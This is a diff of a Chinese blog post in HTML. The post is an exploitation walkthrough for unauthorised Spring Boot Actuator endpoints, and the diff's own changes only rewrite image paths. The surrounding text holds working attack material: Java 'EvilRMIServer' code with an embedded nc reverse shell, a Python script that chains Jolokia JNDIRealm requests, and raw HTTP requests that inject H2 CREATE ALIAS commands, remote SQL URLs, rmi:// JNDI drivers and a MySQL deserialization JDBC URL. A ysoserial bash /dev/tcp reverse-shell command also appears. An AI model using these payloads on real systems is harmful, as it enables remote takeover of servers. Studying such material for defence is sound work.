-<p><img src="/2021/10/22/Spring%20Boot%20Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/1e7783f49e5d0511d34e21997052151e.png"></p>
+<p>![](Spring Boot Actuator未授权访问利用实战利用/1e7783f49e5d0511d34e21997052151e.png)</p>
 <p>可以看到kali下获取反弹的shell</p>
-<p><img src="/2021/10/22/Spring%20Boot%20Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/a288f1cbdbcfd6a43eb37a0aa8362ef4.png"></p>
+<p>![](Spring Boot Actuator未授权访问利用实战利用/a288f1cbdbcfd6a43eb37a0aa8362ef4.png)</p>
 <p><strong>注: 如果目标成功请求了example.xml并且 marshalsec 也接收到了目标请求，但是目标没有请求JNDIObject.class，大概率是因为目标环境的 jdk 版本太高，导致 JNDI 利用失败。</strong></p>
 <h5 id="利用原理-3"><a href="#利用原理-3" class="headerlink" title="利用原理"></a><strong>利用原理</strong></h5><ul>
 <li><p>直接访问可触发漏洞的 URL，相当于通过 jolokia 调用<br>ch.qos.logback.classic.jmx.JMXConfigurator 类的 reloadByURL 方法</p>
@@ -839,7 +839,7 @@
 <p><strong>步骤六：发送恶意 payload</strong></p>
 <p>根据实际情况修改 <a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-realm-jndi-rce.py">springboot-realm-jndi-rce.py</a> 脚本中的目标地址，RMI 地址、端口等信息，然后在自己控制的服务器上运行</p>
 <h5 id="利用实例-4"><a href="#利用实例-4" class="headerlink" title="利用实例"></a>利用实例</h5><p>查看/jolokia/list 中存在的是否存在org.apache.catalina.mbeans.MBeanFactory类提供的createJNDIRealm方法</p>
-<p><img src="/2021/10/22/Spring%20Boot%20Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/4f19e2342528cdbb64de48d186e11598.png"></p>
+<p>![](Spring Boot Actuator未授权访问利用实战利用/4f19e2342528cdbb64de48d186e11598.png)</p>
 <p>下面为编写的java代码漏洞利用poc，指定了反弹shell的ip地址和端口及其开启rmi服务的端口</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.registry.*;</span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.*;</span><br><span class="line"><span class="keyword">import</span> javax.naming.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilRMIServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Creating evil RMI registry on port 8090&quot;</span>);<span class="comment">//RMI服务地址为8090</span></span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1097</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory</span></span><br><span class="line">        ResourceRef ref = <span class="keyword">new</span> ResourceRef(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, <span class="keyword">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="keyword">true</span>,<span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="keyword">null</span>);</span><br><span class="line">        <span class="comment">//redefine a setter name for the &#x27;x&#x27; property from &#x27;setX&#x27; to &#x27;eval&#x27;, see BeanFactory.getObjectInstance code</span></span><br><span class="line">        ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;x=eval&quot;</span>));</span><br><span class="line">        <span class="comment">//expression language to execute &#x27;nslookup jndi.s.artsploit.com&#x27;, modify /bin/sh to cmd.exe if you target windows</span></span><br><span class="line">        ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;x&quot;</span>, <span class="string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;/bin/sh&#x27;,&#x27;-c&#x27;,&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.233.249 1234 &gt;/tmp/f&#x27;]).start()\&quot;)&quot;</span>));</span><br><span class="line">         <span class="comment">//反弹shell地址为192.168.233.249，端口为1234</span></span><br><span class="line">        </span><br><span class="line">        ReferenceWrapper referenceWrapper = <span class="keyword">new</span> com.sun.jndi.rmi.registry.ReferenceWrapper(ref);</span><br><span class="line">        registry.bind(<span class="string">&quot;jndi&quot;</span>, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
@@ -849,13 +849,13 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令:mvn clean install</span><br></pre></td></tr></table></figure>
 
 <p>打包成功</p>
-<p><img src="/2021/10/22/Spring%20Boot%20Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/d4957a0c50e626f62d06f5fc2853ddbb.png"></p>
+<p>![](Spring Boot Actuator未授权访问利用实战利用/d4957a0c50e626f62d06f5fc2853ddbb.png)</p>
 <p>使用打包好的jar包-RMIServer-0.1.0.jar指定开启服务的ip地址，运行RMI服务</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Djava.rmi.server.hostname=192.168.233.249 -jar RMIServer-0.1.0.jar</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2021/10/22/Spring%20Boot%20Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/22d452ce68c413decf2ec38b91407be8.png"></p>
+<p>![](Spring Boot Actuator未授权访问利用实战利用/22d452ce68c413decf2ec38b91407be8.png)</p>
 <p>在kali上使用nc监听1234端口</p>
-<p><img src="/2021/10/22/Spring%20Boot%20Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/6c60a7d0bba412dd195a483ca8f132df.png"></p>
+<p>![](Spring Boot Actuator未授权访问利用实战利用/6c60a7d0bba412dd195a483ca8f132df.png)</p>
 <p>使用exploit.py脚本对目标进行重放</p>
 <p>代码如下:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> pprint <span class="keyword">import</span> pprint</span><br><span class="line"></span><br><span class="line">url = sys.argv[<span class="number">1</span>] + <span class="string">&quot;/jolokia/&quot;</span></span><br><span class="line">pprint(url)</span><br><span class="line"><span class="comment">#创建JNDIRealm</span></span><br><span class="line">create_JNDIrealm = &#123;</span><br><span class="line">    <span class="string">&quot;mbean&quot;</span>: <span class="string">&quot;Tomcat:type=MBeanFactory&quot;</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;EXEC&quot;</span>,</span><br><span class="line">    <span class="string">&quot;operation&quot;</span>: <span class="string">&quot;createJNDIRealm&quot;</span>,</span><br><span class="line">    <span class="string">&quot;arguments&quot;</span>: [<span class="string">&quot;Tomcat:type=Engine&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#写入contextFactory</span></span><br><span class="line">set_contextFactory = &#123;</span><br><span class="line">    <span class="string">&quot;mbean&quot;</span>: <span class="string">&quot;Tomcat:realmPath=/realm0,type=Realm&quot;</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;WRITE&quot;</span>,</span><br><span class="line">    <span class="string">&quot;attribute&quot;</span>: <span class="string">&quot;contextFactory&quot;</span>,</span><br><span class="line">    <span class="string">&quot;value&quot;</span>: <span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#写入connectionURL为自己公网RMI service地址</span></span><br><span class="line">set_connectionURL = &#123;</span><br><span class="line">    <span class="string">&quot;mbean&quot;</span>: <span class="string">&quot;Tomcat:realmPath=/realm0,type=Realm&quot;</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;WRITE&quot;</span>,</span><br><span class="line">    <span class="string">&quot;attribute&quot;</span>: <span class="string">&quot;connectionURL&quot;</span>,</span><br><span class="line">    <span class="string">&quot;value&quot;</span>: <span class="string">&quot;rmi://192.168.233.249:8090/jndi&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#停止Realm</span></span><br><span class="line">stop_JNDIrealm = &#123;</span><br><span class="line">    <span class="string">&quot;mbean&quot;</span>: <span class="string">&quot;Tomcat:realmPath=/realm0,type=Realm&quot;</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;EXEC&quot;</span>,</span><br><span class="line">    <span class="string">&quot;operation&quot;</span>: <span class="string">&quot;stop&quot;</span>,</span><br><span class="line">    <span class="string">&quot;arguments&quot;</span>: []</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#运行Realm，触发JNDI 注入</span></span><br><span class="line">start = &#123;</span><br><span class="line">    <span class="string">&quot;mbean&quot;</span>: <span class="string">&quot;Tomcat:realmPath=/realm0,type=Realm&quot;</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;EXEC&quot;</span>,</span><br><span class="line">    <span class="string">&quot;operation&quot;</span>: <span class="string">&quot;start&quot;</span>,</span><br><span class="line">    <span class="string">&quot;arguments&quot;</span>: []</span><br><span class="line">&#125;</span><br><span class="line">expoloit = [create_JNDIrealm, set_contextFactory, set_connectionURL, stop_JNDIrealm, start]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> expoloit:</span><br><span class="line">    rep = req.post(url, json=i)</span><br><span class="line">    pprint(rep.json())</span><br><span class="line"></span><br></pre></td></tr></table></figure>
@@ -865,9 +865,9 @@
 <p>在kali上使用python运行该脚本，指定目标ip地址和端口</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令:python exploit.py http://192.168.233.247:8090</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2021/10/22/Spring%20Boot%20Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/9a08beff758b28b994d334ea398a856f.png"></p>
+<p>![](Spring Boot Actuator未授权访问利用实战利用/9a08beff758b28b994d334ea398a856f.png)</p>
 <p>该脚本运行成功后，可以看到kali的nc反弹shell成功</p>
-<p><img src="/2021/10/22/Spring%20Boot%20Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/f234a703de0dd6e5042e6ee09f60fb1e.png"></p>
+<p>![](Spring Boot Actuator未授权访问利用实战利用/f234a703de0dd6e5042e6ee09f60fb1e.png)</p>
 <h5 id="利用原理-4"><a href="#利用原理-4" class="headerlink" title="利用原理"></a>利用原理</h5><ul>
 <li>创建 JNDIRealm</li>
 <li>写入 contextFactory 为 RegistryContextFactory</li>
@@ -905,22 +905,22 @@
 
 
 <h5 id="利用实例-5"><a href="#利用实例-5" class="headerlink" title="利用实例"></a>利用实例</h5><p>首先判断在/env变量中是否存在h2.database依赖spring.datasource.hikari.connection-test-query</p>
-<p>![image-20210830180327037](Spring Boot Actuator未授权访问利用实战利用.assets/image-20210830180327037.png)</p>
+<p>![image-20210830180327037](Spring Boot Actuator未授权访问利用实战利用/image-20210830180327037.png)</p>
 <p>构造Post请求/actuator/env设置依赖为需要执行的命令，这里使用的是nc反向连接自己的主机192.168.233.242的1234端口</p>
 <p>请求数据包如下:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/env HTTP/1.1</span><br><span class="line">Host: 192.168.233.242:9096</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.datasource.hikari.connection-test-query&quot;,&quot;value&quot;:&quot;CREATE ALIAS T6 AS CONCAT(&#x27;void ex(String m1,String m2,String m3)throws Exception&#123;Runti&#x27;,&#x27;me.getRun&#x27;,&#x27;time().exe&#x27;,&#x27;c(new String[]&#123;m1,m2,m3&#125;);&#125;&#x27;);CALL T6(&#x27;nc&#x27;,&#x27;192.168.233.242&#x27;,&#x27;1234&#x27;);&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
 
 <p><strong>注:T6这个别名参数，每个参数只能使用一次，每个payload用完后要修改这个别名参数，否则不能执行</strong></p>
-<p>![image-20210830180618708](Spring Boot Actuator未授权访问利用实战利用.assets/image-20210830180618708.png)</p>
+<p>![image-20210830180618708](Spring Boot Actuator未授权访问利用实战利用/image-20210830180618708.png)</p>
 <p>在自己的主机上使用nc监听1234端口</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 1234</span><br></pre></td></tr></table></figure>
 
 
 
 <p>构造请求/actuator/restart数据包，重启</p>
-<p>![image-20210830180129484](Spring Boot Actuator未授权访问利用实战利用.assets/image-20210830180129484.png)</p>
+<p>![image-20210830180129484](Spring Boot Actuator未授权访问利用实战利用/image-20210830180129484.png)</p>
 <p>重启后，可以看到目标连接成功</p>
-<p>![image-20210830181954887](Spring Boot Actuator未授权访问利用实战利用.assets/image-20210830181954887.png)</p>
+<p>![image-20210830181954887](Spring Boot Actuator未授权访问利用实战利用/image-20210830181954887.png)</p>
 <h5 id="利用原理-5"><a href="#利用原理-5" class="headerlink" title="利用原理"></a>利用原理</h5><ul>
 <li>spring.datasource.hikari.connection-test-query 属性被设置为一条恶意的 <code>CREATE ALIAS</code> 创建自定义函数的 SQL 语句</li>
 <li>其属性对应 HikariCP 数据库连接池的 connectionTestQuery 配置，定义一个新数据库连接之前被执行的 SQL 语句</li>
@@ -984,11 +984,11 @@
 <p>请求报文如下:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/env HTTP/1.1</span><br><span class="line">Host: 192.168.233.242:9096</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 83</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.datasource.data&quot;,&quot;value&quot;:&quot;http://192.168.233.242:8080/example.sql&quot;&#125;</span><br></pre></td></tr></table></figure>
 
-<p>![image-20210831171742647](Spring Boot Actuator未授权访问利用实战利用.assets/image-20210831171742647.png)</p>
+<p>![image-20210831171742647](Spring Boot Actuator未授权访问利用实战利用/image-20210831171742647.png)</p>
 <p>在调用/actuator/restart端点进行重启springboot项目</p>
-<p>![image-20210831173855310](Spring Boot Actuator未授权访问利用实战利用.assets/image-20210831173855310.png)</p>
+<p>![image-20210831173855310](Spring Boot Actuator未授权访问利用实战利用/image-20210831173855310.png)</p>
 <p>重启springboot后反弹shell成功</p>
-<p>![image-20210830181954887](Spring Boot Actuator未授权访问利用实战利用.assets/image-20210830181954887.png)</p>
+<p>![image-20210830181954887](Spring Boot Actuator未授权访问利用实战利用/image-20210830181954887.png)</p>
 <h5 id="利用原理-6"><a href="#利用原理-6" class="headerlink" title="利用原理"></a>利用原理</h5><ul>
 <li>目标机器可以通过 spring.datasource.data 属性来设置 jdbc DML sql 文件的 URL 地址</li>
 <li>restart 重启应用后，程序会请求设置的 URL 地址</li>
@@ -1035,7 +1035,7 @@
 
 
 <h5 id="利用实例-7"><a href="#利用实例-7" class="headerlink" title="利用实例"></a>利用实例</h5><p>访问目标站点的/h2-console页面，url会跳转到/h2-console/login.jsp?jsessionid=10f21eec1f912ae36cd39c55740101b5</p>
-<p>![image-20210830204241737](Spring Boot Actuator未授权访问利用实战利用.assets/image-20210830204241737.png)</p>
+<p>![image-20210830204241737](Spring Boot Actuator未授权访问利用实战利用/image-20210830204241737.png)</p>
 <p>这里的开启RMI服务JAVA代码如下:</p>
 <p>反弹shell到192.168.233.242的1234端口</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import java.rmi.registry.*;</span><br><span class="line">import com.sun.jndi.rmi.registry.*;</span><br><span class="line">import javax.naming.*;</span><br><span class="line">import org.apache.naming.ResourceRef;</span><br><span class="line"> </span><br><span class="line">public class EvilRMIServer &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        System.out.println(&quot;Creating evil RMI registry on port 8090&quot;);//RMI服务监听地址为8090</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(1097);</span><br><span class="line"> </span><br><span class="line">        //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory</span><br><span class="line">        ResourceRef ref = new ResourceRef(&quot;javax.el.ELProcessor&quot;, null, &quot;&quot;, &quot;&quot;, true,&quot;org.apache.naming.factory.BeanFactory&quot;,null);</span><br><span class="line">        //redefine a setter name for the &#x27;x&#x27; property from &#x27;setX&#x27; to &#x27;eval&#x27;, see BeanFactory.getObjectInstance code</span><br><span class="line">        ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;x=eval&quot;));</span><br><span class="line">        //expression language to execute &#x27;nslookup jndi.s.artsploit.com&#x27;, modify /bin/sh to cmd.exe if you target windows</span><br><span class="line">        ref.add(new StringRefAddr(&quot;x&quot;, &quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;/bin/sh&#x27;,&#x27;-c&#x27;,&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.233.242 1234 &gt;/tmp/f&#x27;]).start()\&quot;)&quot;));</span><br><span class="line">         </span><br><span class="line">        </span><br><span class="line">        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);</span><br><span class="line">        registry.bind(&quot;jndi&quot;, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -1045,11 +1045,11 @@
 <p>将该代码进行maven打包</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn install</span><br></pre></td></tr></table></figure>
 
-<p>![image-20210830204556955](Spring Boot Actuator未授权访问利用实战利用.assets/image-20210830204556955.png)</p>
+<p>![image-20210830204556955](Spring Boot Actuator未授权访问利用实战利用/image-20210830204556955.png)</p>
 <p>然后指定访问ip地址开启RMI服务</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Djava.rmi.server.hostname=192.168.233.242 -jar RMIServer-0.1.0.jar</span><br></pre></td></tr></table></figure>
 
-<p>![image-20210830204855751](Spring Boot Actuator未授权访问利用实战利用.assets/image-20210830204855751.png)</p>
+<p>![image-20210830204855751](Spring Boot Actuator未授权访问利用实战利用/image-20210830204855751.png)</p>
 <p>使用nc监听端口</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 1234</span><br></pre></td></tr></table></figure>
 
@@ -1059,9 +1059,9 @@
 <p>请求报文如下:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /h2-console/login.do?jsessionid=152896463738fcc39cb0a74a0e3b5a1e HTTP/1.1</span><br><span class="line">Host: 192.168.233.242:9096</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://192.168.233.242:9096/h2-console/login.jsp?jsessionid=10f21eec1f912ae36cd39c55740101b5</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 163</span><br><span class="line"></span><br><span class="line">language=en&amp;setting=Generic+H2+%28Embedded%29&amp;name=Generic+H2+%28Embedded%29&amp;driver=javax.naming.InitialContext&amp;url=rmi://192.168.233.242:8090/jndi&amp;user=&amp;password=</span><br></pre></td></tr></table></figure>
 
-<p>![image-20210830211055253](Spring Boot Actuator未授权访问利用实战利用.assets/image-20210830211055253.png)</p>
+<p>![image-20210830211055253](Spring Boot Actuator未授权访问利用实战利用/image-20210830211055253.png)</p>
 <p>可以看到nc连接shell成功</p>
-<p>![image-20210830211733059](Spring Boot Actuator未授权访问利用实战利用.assets/image-20210830211733059.png)</p>
+<p>![image-20210830211733059](Spring Boot Actuator未授权访问利用实战利用/image-20210830211733059.png)</p>
 <h5 id="利用原理-7"><a href="#利用原理-7" class="headerlink" title="利用原理"></a>利用原理</h5><ul>
 <li>设置恶意url参数向h2-console/login.do?session=xxxx发出请求</li>
 <li>服务器访问恶意url中的RMI服务，发生JNDI注入</li>
@@ -1126,27 +1126,27 @@
 <p><strong>步骤六：恢复正常 jdbc url</strong></p>
 <p>反序列化漏洞利用完成后，使用 <strong>步骤三</strong> 的方法恢复 <strong>步骤一</strong> 中记录的 <code>spring.datasource.url</code> 的原始 <code>value</code> 值</p>
 <h5 id="利用实例-8"><a href="#利用实例-8" class="headerlink" title="利用实例"></a>利用实例</h5><p>访问目标站点 <a target="_blank" rel="noopener" href="http://192.168.233.242:9097/actuator/evn">http://192.168.233.242:9097/actuator/evn</a>   查看环境变量设置和依赖</p>
-<p>![image-20210901112521481](Spring Boot Actuator未授权访问利用实战利用.assets/image-20210901112521481.png)</p>
+<p>![image-20210901112521481](Spring Boot Actuator未授权访问利用实战利用/image-20210901112521481.png)</p>
 <p>然后架设恶意 rogue mysql server，使用 <a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial">ysoserial</a> 自定义要执行的命令，讲生成的文件放置在</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections3 ‘bash -i &gt;&amp; /dev/tcp/192.168.233.242/1234 0&gt;&amp;1’ &gt; payload.ser</span><br></pre></td></tr></table></figure>
 
 
 
 <p>然后运行 <a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-jdbc-deserialization-rce.py">springboot-jdbc-deserialization-rce.py</a> 脚本开启3306端口</p>
-<p>![image-20210901141559697](Spring Boot Actuator未授权访问利用实战利用.assets/image-20210901141559697.png)</p>
+<p>![image-20210901141559697](Spring Boot Actuator未授权访问利用实战利用/image-20210901141559697.png)</p>
 <p>POST方式构造请求/actuator/env，设置spring.datasource.url为上面开启服务的ip地址</p>
 <p>请求报文如下:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/env HTTP/1.1</span><br><span class="line">Host: 192.168.233.242:9097</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 216</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.datasource.url&quot;,&quot;value&quot;:&quot;jdbc:mysql://192.168.233.242:3306/mysql?characterEncoding=utf8&amp;useSSL=false&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true&quot;&#125;</span><br></pre></td></tr></table></figure>
 
-<p>![image-20210901142357376](Spring Boot Actuator未授权访问利用实战利用.assets/image-20210901142357376.png)</p>
+<p>![image-20210901142357376](Spring Boot Actuator未授权访问利用实战利用/image-20210901142357376.png)</p>
 <p>访问/actuator/refresh刷新配置</p>
-<p>![image-20210901142612261](Spring Boot Actuator未授权访问利用实战利用.assets/image-20210901142612261.png)</p>
+<p>![image-20210901142612261](Spring Boot Actuator未授权访问利用实战利用/image-20210901142612261.png)</p>
